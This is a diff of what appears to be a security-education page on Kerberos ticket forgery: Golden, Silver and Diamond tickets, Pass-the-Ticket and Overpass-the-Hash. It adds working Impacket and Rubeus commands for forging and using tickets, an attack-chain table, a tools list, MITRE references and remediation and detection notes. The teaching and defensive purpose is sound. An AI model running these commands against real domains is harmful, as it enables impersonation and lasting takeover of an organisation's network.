+              { label: "3. Golden Ticket — forge a TGT with the krbtgt key (from DCSync)", cmd: "ticketer.py -nthash <krbtgt_nthash> -aesKey <krbtgt_aes256> \\\n  -domain-sid <domain_sid> -domain corp.local Administrator\nexport KRB5CCNAME=Administrator.ccache\n# impersonate anyone, including fabricated admins; survives password resets" },
+              { label: "4. Diamond Ticket — modify a real TGT (stealthier than Golden)", cmd: "# request a legit TGT, decrypt with the krbtgt key, edit the PAC, re-encrypt\nRubeus.exe diamond /krbkey:<krbtgt_aes> /user:jdoe /password:pass \\\n  /ticketuser:Administrator /ticketuserid:500 /groups:512\n# the ticket has a matching legitimate 4768 request -> harder to spot" },
+              { label: "5. Use the forged ticket", cmd: "psexec.py -k -no-pass dc01.corp.local   # or secretsdump / any Kerberos tool" }
+            ]
+          },
           {
             title: "The Family",
             type: "table",
             columns: ["Attack", "Key needed / scope"],
             rows: [
-              ["Overpass-the-Hash", "A user's NT hash -> a legitimate TGT for that user"],
-              ["Pass-the-Ticket", "A stolen TGT/service ticket -> reuse its access"],
-              ["Silver Ticket", "A service account key -> forge a ticket for that one service (very stealthy)"],
-              ["Golden Ticket", "The krbtgt key -> forge TGTs for anyone, domain-wide, durable"],
-              ["Diamond Ticket", "krbtgt key -> modify a real TGT (stealthier than Golden)"]
+              ["Overpass-the-Hash", "A user's NT hash → a legitimate TGT for that user"],
+              ["Pass-the-Ticket", "A stolen TGT/service ticket → reuse its access"],
+              ["Silver Ticket", "A service/computer key → forge a ticket for that one service (very stealthy)"],
+              ["Golden Ticket", "The krbtgt key → forge TGTs for anyone, domain-wide, durable"],
+              ["Diamond Ticket", "The krbtgt key → modify a real TGT (evades 'ticket with no request' detection)"]
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Total domain control", "A Golden Ticket impersonates any principal, including fabricated admins"],
-              ["Durable persistence", "Survives password resets; only rotating krbtgt twice invalidates it"],
-              ["Silent service access", "Silver Tickets never contact the DC — minimal telemetry"],
-              ["Fast re-entry", "Regain access after remediation if krbtgt was not rotated"]
+              ["1", "Steal key material (DCSync krbtgt / dump a service key)", "The signing key for forgery"],
+              ["2", "Forge the appropriate ticket", "Golden (domain) / Silver (one service)"],
+              ["3", "Pass-the-ticket into a session", "Authenticated as the impersonated principal"],
+              ["4", "Act (DCSync, PsExec, data access)", "Domain-wide control / persistence"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Impacket ticketer.py", "Forge Golden/Silver tickets"],
+              ["Rubeus", "diamond/golden/silver, ptt, asktgt (overpass-the-hash)"],
+              ["Mimikatz", "kerberos::golden, sekurlsa::pth, ptt"],
+              ["Impacket getTGT.py / secretsdump", "Overpass-the-hash and obtain krbtgt"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1558.001 — Golden Ticket", url: "https://attack.mitre.org/techniques/T1558/001/" },
+              { label: "The Hacker Recipes — Forged tickets", url: "https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Protect the krbtgt key — it is the domain's root of trust; rotate it twice after any suspected Tier-0 compromise.",
-              "Isolate Tier-0 credentials so TGTs cannot be stolen from ordinary workstations.",
-              "Keep Kerberos ticket lifetimes short and monitor for tickets with anomalous lifetimes or impossible group claims.",
-              "Alert on ticket use with no matching 4768/4769 request on the DC (Golden/Silver indicator).",
-              "Deploy Credential Guard to make extracting the key material far harder in the first place."
+              "Protect the krbtgt key; rotate it twice (with a replication interval) after any suspected Tier-0 compromise.",
+              "Isolate Tier-0 credentials so TGTs and service keys cannot be stolen from ordinary workstations.",
+              "Keep Kerberos ticket lifetimes short; enable Credential Guard to make key extraction from LSASS far harder.",
+              "Detect: tickets used with no matching 4768/4769 request on the DC (Golden/Silver), anomalous ticket lifetimes, and impossible group claims in the PAC.",
+              "Silver Tickets are hardest to detect — enforce SMB signing and monitor service-account behaviour."
             ]
           }
         ]
